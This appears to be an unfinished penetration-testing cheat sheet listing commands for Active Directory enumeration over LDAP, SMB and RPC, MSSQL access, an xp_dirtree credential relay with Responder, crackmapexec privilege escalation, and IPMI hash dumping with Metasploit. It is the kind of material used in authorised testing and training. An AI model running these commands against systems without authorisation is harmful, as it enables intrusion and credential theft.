#### Ldap enumeration
- What is it?

- How to perform it:
```
# Domain users
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(&(objectClass=user)(objectCategory=person))" name sAMAccountName userPrincipalName memberOf primaryGroupID adminCount userAccountControl description servicePrincipalName objectSid pwdLastSet lastLogon -E pr=1000/noprompt | tee domain_users.txt

# Domain computers
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(objectClass=computer)" name dNSHostname memberOf operatingSystem operatingSystemVersion lastLogonTimestamp servicePrincipalName description userAccountControl | tee domain_computers.txt

# Domain groups
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(objectClass=group)" name sAMAccountName memberOf member description objectSid | tee domain_groups.txt
```

#### SMB
- What

- How to perform it
```
smbmap -u user -p password -d domain -H x.x.x.x -R recursive share listing --dir-only stays in the directory
```
#### Rpc enumeration
- What is it?

- How to perform it:
```
rpcclient -U "DOMAIN/username%password" <domaincontroller name or IP>"
queryuser 0x457
dsr_enumtrustdom
enumdomains
enumdomusers
enumdomgroups
getdompwinfo
getdompwinfo
```

#### SQL 1433
- What is it?

- How to perform it:
```
#Connect to SQL
impacket-mssqlclient 'domain/user:pass@x.x.x.x'  -windows-auth

#Credential Relay Attack
exec master..xp_dirtree '\\TargetIP\FakeShare';  run responder

# Xp-CMD Attack
```

#### MSSQL Escalate
- What is it?

- How to perform it:
```
1) crackmapexec mssql 10.10.10.1 -u username -p password –local-auth -M mssql_priv
2) crackmapexec mssql 10.10.10.1 -u username -p password –local-auth -M mssql_priv -o “ACTIONprivexec”
3) crackmapexec mssql 10.10.10.1 -u username -p password –local-auth -x whoami
4) crackmapexec mssql 10.10.10.1 -u username -p password –local-auth -o “ACTION-rollback”
```

#### IPMI udp 623
- What is it?
		[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host.
- How to perform it:
```
# Enumerate IPMI
sudo nmap -sU --script ipmi-version -p 623 ilo.domain.local

# Metasploit
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/ipmi/ipmi_dumphashes

```
